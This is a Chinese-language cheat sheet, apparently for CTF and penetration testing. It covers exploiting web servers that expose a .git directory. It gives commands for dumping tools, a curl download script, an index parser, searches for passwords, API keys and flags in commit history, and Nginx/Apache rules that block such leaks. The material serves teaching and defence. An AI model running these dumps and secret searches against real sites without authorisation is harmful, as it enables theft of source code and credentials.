# CTF Git 工具大全

> Git 在 CTF 中的应用主要包括 .git 目录泄露利用、源码恢复、历史记录挖掘等。

---

## 目录
1. [概述](#概述)
2. [.git 泄露检测](#git-泄露检测)
3. [源码恢复工具](#源码恢复工具)
4. [历史挖掘工具](#历史挖掘工具)
5. [自动化利用工具](#自动化利用工具)
6. [手动利用方法](#手动利用方法)
7. [实战案例](#实战案例)
8. [防御措施](#防御措施)

---

## 概述

### Git 泄露的危害

当 Web 服务器的 `.git` 目录可以被访问时，攻击者可以:
- 🔓 下载完整源代码
- 📜 查看开发历史和提交记录
- 🔑 发现硬编码的密码、密钥
- 🐛 找到已修复但未公开的漏洞
- 👤 获取开发者信息

### 常见泄露路径

```
http://example.com/.git/
http://example.com/.git/config
http://example.com/.git/HEAD
http://example.com/.git/index
http://example.com/.git/logs/HEAD
```

---

## .git 泄露检测

### 工具1: GitHacker ⭐⭐⭐⭐⭐

**最流行的 .git 泄露利用工具**

```bash
# 安装
pip3 install GitHacker

# 使用
githacker --url http://example.com/.git/ --output-folder result

# 或从 GitHub 安装
git clone https://github.com/WangYihang/GitHacker.git
cd GitHacker
pip3 install -r requirements.txt
python3 GitHacker.py --url http://example.com/.git/ --output-folder result
```

**特点**:
- ✅ 自动检测并下载所有对象
- ✅ 支持多线程加速
- ✅ 自动恢复源码
- ✅ 支持索引文件解析

### 工具2: git-dumper ⭐⭐⭐⭐⭐

**功能强大的 Git 源码泄露利用工具**

```bash
# 安装
pip3 install git-dumper

# 使用
git-dumper http://example.com/.git/ output_dir

# 或从源码安装
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip3 install -r requirements.txt
python3 git-dumper.py http://example.com/.git/ output_dir
```

**特点**:
- ✅ 支持部分泄露恢复
- ✅ 自动处理 packed objects
- ✅ 恢复所有分支
- ✅ Python 3 支持

### 工具3: GitTools ⭐⭐⭐⭐

**经典的 Git 泄露利用工具集**

```bash
# 安装
git clone https://github.com/internetwache/GitTools.git
cd GitTools

# 1. Dumper - 下载 .git 目录
cd Dumper
bash gitdumper.sh http://example.com/.git/ output_dir

# 2. Extractor - 从下载的 .git 提取源码
cd ../Extractor
bash extractor.sh output_dir extracted

# 3. Finder - 批量查找 .git 泄露
cd ../Finder
bash gitfinder.py -i targets.txt
```

**特点**:
- ✅ 三个独立工具
- ✅ Bash 脚本实现
- ✅ 轻量级

### 工具4: dvcs-ripper ⭐⭐⭐⭐

**支持多种版本控制系统**

```bash
# 克隆
git clone https://github.com/kost/dvcs-ripper.git
cd dvcs-ripper

# Git
perl rip-git.pl -v -u http://example.com/.git/

# SVN
perl rip-svn.pl -v -u http://example.com/.svn/

# Mercurial
perl rip-hg.pl -v -u http://example.com/.hg/

# Bazaar
perl rip-bzr.pl -v -u http://example.com/.bzr/
```

**特点**:
- ✅ 支持 Git、SVN、Mercurial、Bazaar
- ✅ Perl 实现
- ✅ 详细输出

### 工具5: scrabble ⭐⭐⭐

**快速的 .git 文件夹扫描器**

```bash
# 安装
go install github.com/BishopFox/scrabble@latest

# 使用
scrabble http://example.com

# 指定 .git 路径
scrabble http://example.com/.git/
```

**特点**:
- ✅ Go 语言编写，速度快
- ✅ 自动检测常见路径
- ✅ 简单易用

---

## 源码恢复工具

### git-cola ⭐⭐⭐⭐

**图形化 Git 客户端，便于查看历史**

```bash
# 安装
brew install git-cola  # macOS
sudo apt install git-cola  # Linux

# 使用
cd recovered_repo
git-cola
```

### GitKraken ⭐⭐⭐⭐⭐

**专业的 Git GUI 工具**

- 下载: https://www.gitkraken.com/
- 功能: 可视化分支、历史、差异对比
- 适合: 深入分析复杂的 Git 仓库

### tig ⭐⭐⭐⭐

**终端下的 Git 仓库浏览器**

```bash
# 安装
brew install tig  # macOS
sudo apt install tig  # Linux

# 使用
cd recovered_repo
tig  # 浏览提交历史
tig blame filename  # 查看文件修改历史
```

---

## 历史挖掘工具

### git-secrets ⭐⭐⭐⭐⭐

**AWS 开发的密钥扫描工具**

```bash
# 安装
brew install git-secrets  # macOS
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets && make install

# 扫描仓库
cd target_repo
git secrets --scan-history

# 注册 AWS 规则
git secrets --register-aws
```

### truffleHog ⭐⭐⭐⭐⭐

**高熵字符串和密钥检测**

```bash
# 安装
pip3 install truffleHog

# 扫描远程仓库
trufflehog https://github.com/user/repo.git

# 扫描本地仓库
trufflehog file:///path/to/repo

# 只扫描高熵字符串
trufflehog --entropy=True file:///path/to/repo

# 输出 JSON 格式
trufflehog --json file:///path/to/repo > results.json
```

### gitleaks ⭐⭐⭐⭐⭐

**快速的密钥泄露检测工具**

```bash
# 安装
brew install gitleaks  # macOS
# 或下载: https://github.com/zricethezav/gitleaks/releases

# 扫描仓库
gitleaks detect --source /path/to/repo

# 扫描特定分支
gitleaks detect --source /path/to/repo --branch main

# 生成报告
gitleaks detect --source /path/to/repo --report-format json --report-path report.json
```

### gitrob ⭐⭐⭐⭐

**GitHub/GitLab 组织侦察工具**

```bash
# 安装
go install github.com/michenriksen/gitrob@latest

# 使用
gitrob -github-access-token TOKEN organization_name

# 扫描多个目标
gitrob -github-access-token TOKEN user1 user2 org1
```

### repo-supervisor ⭐⭐⭐⭐

**实时监控和扫描**

```bash
# 安装
pip3 install repo-supervisor

# 扫描
repo-supervisor --url https://github.com/user/repo.git
```

---

## 自动化利用工具

### GitHack ⭐⭐⭐⭐

**自动化 .git 泄露利用**

```bash
# 安装
git clone https://github.com/lijiejie/GitHack.git
cd GitHack

# 使用
python GitHack.py http://example.com/.git/
```

### git-money ⭐⭐⭐

**批量扫描和利用**

```bash
# 安装
git clone https://github.com/dnoiz1/git-money.git
cd git-money

# 使用
python git-money.py -u http://example.com/.git/
```

---

## 手动利用方法

### 方法1: 使用 wget 镜像

```bash
# 下载整个 .git 目录
wget --mirror --include-directories=/.git http://example.com/.git/

# 或使用 curl
curl -O http://example.com/.git/config
curl -O http://example.com/.git/HEAD
# ... 逐个下载
```

### 方法2: 下载关键文件

```bash
#!/bin/bash
# download_git.sh

BASE_URL="http://example.com/.git"

# 关键文件列表
files=(
    "config"
    "HEAD"
    "index"
    "description"
    "COMMIT_EDITMSG"
    "logs/HEAD"
    "logs/refs/heads/master"
    "refs/heads/master"
)

# 创建目录结构
mkdir -p .git/logs/refs/heads
mkdir -p .git/objects
mkdir -p .git/refs/heads

# 下载文件
for file in "${files[@]}"; do
    curl -s "$BASE_URL/$file" -o ".git/$file"
done

echo "关键文件下载完成"
```

### 方法3: 解析 index 文件

```python
#!/usr/bin/env python3
"""
解析 Git index 文件，获取对象哈希
"""

import struct
import sys

def parse_git_index(index_file):
    """解析 Git index 文件"""
    with open(index_file, 'rb') as f:
        # 读取头部
        signature = f.read(4)  # DIRC
        version = struct.unpack('>I', f.read(4))[0]
        entries = struct.unpack('>I', f.read(4))[0]

        print(f"Signature: {signature}")
        print(f"Version: {version}")
        print(f"Entries: {entries}")
        print("\nFiles:")

        for i in range(entries):
            # 跳过时间戳等信息 (62 bytes)
            f.read(62)

            # 读取路径长度
            flags = struct.unpack('>H', f.read(2))[0]
            path_length = flags & 0xFFF

            # 读取文件路径
            path = f.read(path_length).decode('utf-8')

            # 对齐到8字节边界
            padding = (8 - ((62 + 2 + path_length) % 8)) % 8
            f.read(padding)

            print(f"  {path}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法: python parse_index.py .git/index")
        sys.exit(1)

    parse_git_index(sys.argv[1])
```

### 方法4: 恢复对象文件

```bash
# 1. 获取对象哈希（从 index 或 HEAD）
cat .git/refs/heads/master
# 输出: abc123...

# 2. 计算对象路径
# 前2位作为目录，后38位作为文件名
# abc123... -> .git/objects/ab/c123...

# 3. 下载对象
curl http://example.com/.git/objects/ab/c123... -o .git/objects/ab/c123...

# 4. 解压对象（Git 使用 zlib 压缩）
python3 -c "
import zlib
with open('.git/objects/ab/c123...', 'rb') as f:
    print(zlib.decompress(f.read()).decode('utf-8', errors='ignore'))
"

# 5. 使用 git cat-file 查看
git cat-file -p abc123
```

---

## 实战案例

### 案例1: 基础 .git 泄露

```bash
# 1. 检测泄露
curl http://target.com/.git/config

# 2. 使用 GitHacker 下载
githacker --url http://target.com/.git/ --output-folder source

# 3. 查看源码
cd source
ls -la

# 4. 查看历史寻找敏感信息
git log --all --oneline
git show <commit_hash>

# 5. 搜索关键字
grep -r "password" .
grep -r "flag{" .
grep -r "API_KEY" .
```

### 案例2: 历史记录中的密钥

```bash
# 1. 克隆/恢复仓库
git-dumper http://target.com/.git/ repo

# 2. 查看所有提交
cd repo
git log --all --full-history

# 3. 搜索删除的文件
git log --diff-filter=D --summary

# 4. 查看特定文件的历史
git log --all --full-history -- config.php

# 5. 恢复删除的文件
git checkout <commit_hash> -- config.php

# 6. 使用 truffleHog 扫描
trufflehog file:///path/to/repo
```

### 案例3: Stash 中的秘密

```bash
# 1. 列出所有 stash
git stash list

# 2. 查看 stash 内容
git stash show -p stash@{0}

# 3. 应用 stash
git stash apply stash@{0}

# 4. 搜索所有 stash
for stash in $(git stash list | cut -d: -f1); do
    echo "=== $stash ==="
    git stash show -p $stash | grep -i "password\|key\|secret\|flag"
done
```

### 案例4: 查找硬编码凭据

```bash
# 使用 gitleaks
gitleaks detect --source . --verbose

# 使用 git-secrets
git secrets --scan-history

# 手动搜索
git log -S "password" --all --source
git log -G "api_key\s*=\s*['\"][^'\"]+['\"]" --all --patch
```

---

## 常用 Git 命令（CTF 场景）

### 查看提交历史

```bash
# 查看所有分支的提交
git log --all --graph --oneline

# 查看详细信息
git log --all --graph --decorate --stat

# 查看某个文件的修改历史
git log --follow -- filename

# 查看所有操作记录（包括被删除的提交）
git reflog
```

### 搜索内容

```bash
# 在所有提交中搜索字符串
git log -S "password" --all --source

# 搜索正则表达式
git log -G "API_KEY.*=.*" --all --patch

# 在当前提交中搜索
git grep "password"

# 在所有提交中搜索
git rev-list --all | xargs git grep "password"
```

### 比较差异

```bash
# 比较两个提交
git diff commit1 commit2

# 查看文件在两个提交间的变化
git diff commit1 commit2 -- filename

# 查看某个提交的改动
git show commit_hash

# 查看某个文件在某个提交的改动
git show commit_hash:path/to/file
```

### 恢复和检出

```bash
# 检出特定提交
git checkout commit_hash

# 恢复删除的文件
git checkout commit_hash -- deleted_file

# 查看所有分支
git branch -a

# 检出远程分支
git checkout -b local_branch origin/remote_branch
```

---

## 防御措施

### Nginx 配置

```nginx
# 禁止访问 .git 目录
location ~ /\.git {
    deny all;
    return 404;
}

# 禁止访问所有隐藏文件和目录
location ~ /\. {
    deny all;
    return 404;
}
```

### Apache 配置

```apache
# .htaccess
<DirectoryMatch "^\.|\/\.">
    Require all denied
</DirectoryMatch>

# 或
RedirectMatch 404 /\.git
```

### 部署最佳实践

```bash
# 1. 不要部署 .git 目录
rsync -av --exclude='.git' source/ destination/

# 2. 使用 .gitignore
echo ".env" >> .gitignore
echo "config.php" >> .gitignore

# 3. 使用环境变量而非硬编码
# 错误: password = "hardcoded_pass"
# 正确: password = os.getenv("DB_PASSWORD")

# 4. 扫描敏感信息
git secrets --install
git secrets --register-aws

# 5. 定期审计
gitleaks detect --source .
```

---

## 工具对比表

| 工具 | 语言 | 速度 | 功能 | 难度 | 推荐度 |
|------|------|------|------|------|--------|
| GitHacker | Python | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 简单 | ⭐⭐⭐⭐⭐ |
| git-dumper | Python | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 简单 | ⭐⭐⭐⭐⭐ |
| GitTools | Bash | ⭐⭐⭐ | ⭐⭐⭐⭐ | 简单 | ⭐⭐⭐⭐ |
| dvcs-ripper | Perl | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 中等 | ⭐⭐⭐⭐ |
| truffleHog | Python | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 简单 | ⭐⭐⭐⭐⭐ |
| gitleaks | Go | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 简单 | ⭐⭐⭐⭐⭐ |

---

## 快速参考命令

```bash
# === 检测 .git 泄露 ===
curl http://target.com/.git/config

# === 下载源码 ===
githacker --url http://target.com/.git/ --output source
# 或
git-dumper http://target.com/.git/ source

# === 查找敏感信息 ===
cd source
git log --all --oneline
gitleaks detect --source .
trufflehog file://$(pwd)

# === 搜索关键字 ===
grep -r "flag{" .
git log -S "password" --all --source

# === 查看删除的文件 ===
git log --diff-filter=D --summary
git checkout <commit> -- deleted_file
```

---

## 参考资源

### 工具仓库
- GitHacker: https://github.com/WangYihang/GitHacker
- git-dumper: https://github.com/arthaud/git-dumper
- GitTools: https://github.com/internetwache/GitTools
- gitleaks: https://github.com/zricethezav/gitleaks
- truffleHog: https://github.com/trufflesecurity/trufflehog

### 学习资源
- Git 内部原理: https://git-scm.com/book/zh/v2/Git-内部原理
- CTF Wiki: https://ctf-wiki.org/misc/other/git/
- OWASP: https://owasp.org/www-community/vulnerabilities/

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用场景**: CTF、渗透测试、安全审计
